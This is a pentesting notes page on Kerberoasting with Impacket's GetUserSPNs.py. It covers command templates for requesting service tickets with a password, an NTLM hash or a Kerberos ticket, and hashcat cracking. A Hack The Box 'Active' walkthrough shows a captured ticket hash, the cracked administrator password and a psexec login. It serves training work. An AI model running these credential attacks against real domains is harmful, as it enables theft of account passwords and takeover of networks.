---
title:  GetUserSPNs - a module from Impacket
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - kerberos
  - kerberoasting
---
# GetUserSPNs.py 

## Installation

Install Impacket from: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

```bash
git clone https://github.com/fortra/impacket
cd impacket
sudo python3 -m pip install .
```


## Basic commands: kerberoasting

Add dc to `/etc/hosts`. Otherwise, include the flag `-dc-ip` with the domain controller ip.

We will obtain TGS-REP hashes.

```bash

########################################  
# List SPNs in the domain.
########################################

# Gather a listing of SPNs in the domain.
GetUserSPNs.py -dc-ip $ip $domain/$username
impacket-GetUserSPNs  -dc-ip $ip $domain/$username

# Example: If not introduced, password will be prompted to introduce:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
impacket-GetUserSPNs -dc-ip 192.168.175.70 corp.com/pete:MattLovesAutumn1 


########################################  
# Kerberoasting using credentials  
########################################

# Requesting all TGS Tickets
GetUserSPNs.py -dc-ip $ip $domain/$username -request 

# Examples:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
impacket-GetUserSPNs -dc-ip 192.168.175.70 corp.com/pete:MattLovesAutumn1 -request

# Request a single TGS ticket:
GetUserSPNs.py -dc-ip $ip $domain/$username -request-user $userrequested -outputfile file_tgs
# -outputfile:  to write the TGS tickets to a file 

########################################
# Kerberoasting using NTLM hash
########################################

impacket-GetUserSPNs <DOMAIN>/<USER> -hashes :<NTLM_HASH> -request

# Example:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
impacket-GetUserSPNs corp.com/dave -hashes :08d7a47a6f9f66b97b1bae4178747494 -request


########################################  
# Kerberoasting using Kerberos ticket  
########################################  
  
impacket-GetUserSPNs -k -no-pass <DOMAIN>/<USER>  
  
# Example  
impacket-GetUserSPNs -k -no-pass corp.com/administrator  
  
  
########################################  
# Kerberoasting specific user list  
########################################  
  
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -usersfile users.txt  
  
# Example  
impacket-GetUserSPNs corp.com/john:Password123 -usersfile users.txt
```

## Crack the hashes

```bash
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Example from htb-active machine

**1.** Gather a listing of SPNs in the domain. We will need a set of valid domain credentials and the IP address of a Domain Controller.

```bash
GetUserSPNs.py -dc-ip $ip active.htb/SVC_TGS 
```

**2.** Requesting all TGS Tickets:

```bash
GetUserSPNs.py -dc-ip $ip active.htb/SVC_TGS -request
```

Results:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ddcb41b8736d03e6fd0aed759dd84e93$4fd73e3eeba2318f3e9db570e88cb04508799b1d076f2af96929f80ae3a2b78623d8f0feda893620b2fac7bf62bbd43178f02f924f8bc51fff60c69173b759a84e7331f4bc7eb1892ac84a1d037ecac49846dc02b71678ccad1515770c2305fb36a93ecc1f88a110bfc62019612916e27e37f7e60aa99a719a6585f54900b32b4fc9405601cfa627e9b8b031a27dc507567d644f26dd29edcce930abb0aac8653b18329c95152690b093b4d1c83d8cb0792d9a41f19abfdeef26e8026c86869455a927f69f6485a6016a314b3b3f11235e35e3a9ff3fa6a51aaaacbb623d3253efdfb0ce97f8affaf3e470718abdbceafb5e41aa096bc4d646f9d46ca3fe0e4eec87b49cfe283d04a941c0cf07a289ca55ad6560c1ec176e811df5871347c5595d0d7a4c9ec09c6425f7792187a77bf9d8bd625eadc709da3bf93ff010a6c1d9e1d89c9cb4f61ff5850d3142b42d26402d1f1a543f392850fa90b2cfd1945dc80d1982e40a4f3a6179601010e8fd54679b69cafb7d6b2ac89949e694c44363a3c1156f3562e0612f7b32db9f572642de6a7cbc40332c4de68032eae74fea3d0f081b9a6a29568f24ab112352d9af0b5b7bd7d92930b234464dd9a0f4317be7d297fe05894b8a9f36eedc701647ec2ee14471be89bef5fe64213c7bca4cbd425384131b88679a67808da8fbe67bcb7f63a525ba1de04f59ef884d8908cf7d466db1bcca002ea41508ab847b87e439cbdf68abddddd8cc18e0325d9a2fa0bd50b2e5c20d00290efd4ab9b7bf210b6099e550df2258e1143388c569b5390854bf6a72a9dd1c251d9ae1e0d0c29e00d98c40d219d564c20093e576af43c51b76f7050ff377c285d31756c5bd076463675fb3b49454d83c4fb241add2e098ec95222b8d58a67cd7a22e6b9f050a92ca1f0ea0295b4e4a62ff01277c424809e63331a6c1f40c386b68a5bb18400abe4c97088642707cfb4f4234da7887cd1e543e0dfddfba3cc347d90bb10bf1a9d81dc818f8e61def33bb443670577451c2579113a845239e2a6c525e554f10333c2d2074964e0c370f5308552460b66189cf060da62553dfdaaeab7010594d91ec4667c8c88d0e49aa6a39d3c085b38f1f3bfaa2dba16b305d364307845f5b09b28ea89955bfbca2e03a38a900a2b4169ddc4e3e65e74960b87fb5cccf912b7ba05b5a8867dafc3014db326640e4b69b86691ca93730934a9ca48e809f167af52428807f6f8f84999058917bd61881
```

**3.** Crack the ticket 

```bash
 hashcat -m 13100 ticketADM /usr/share/wordlists/rockyou.txt
```

Results: Ticketmaster1968

**4.** Access the host with Administrator credentials:

```
impacket-psexec Administrator:Ticketmaster1968@$ip
```

